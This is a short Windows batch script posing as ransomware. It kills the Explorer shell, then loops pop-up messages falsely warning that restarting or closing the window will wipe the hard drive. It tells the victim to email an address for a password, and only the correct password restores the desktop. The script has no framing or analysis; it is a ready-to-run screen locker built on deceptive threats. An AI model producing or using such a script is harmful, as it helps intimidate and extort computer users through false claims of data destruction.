color 0A
@echo off 
title [Window title]
taskkill /f /im explorer.exe 
:bucle 
cls               
msg * READ CAREFULLY !.
msg * DO NOT RESTART THE COMPUTER !.
msg * REBOOTING WILL DELETE THE DATA ON THE HARD DRIVE !.
msg * BE CAREFUL! DO NOT CLOSE THE UPPER WINDOW.
msg * IF YOU CLOSE THE WINDOW! YOU WILL NOT BE ABLE TO RECOVER YOUR COMPUTER !.
msg * WRITE TO [email] TO GET THE PASSWORD !.
echo =============================================
echo IF YOU CLOSE THIS WINDOW! YOU WILL NOT BE ABLE TO RECOVER YOUR COMPUTER !.
echo =============================================
echo Enter the password that you received in the mail.
echo =============================================
set /p pass=Enter the password here 
if %pass%==[Password] (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Congratulations! The password is correct.
start explorer.exe 
pause
exit
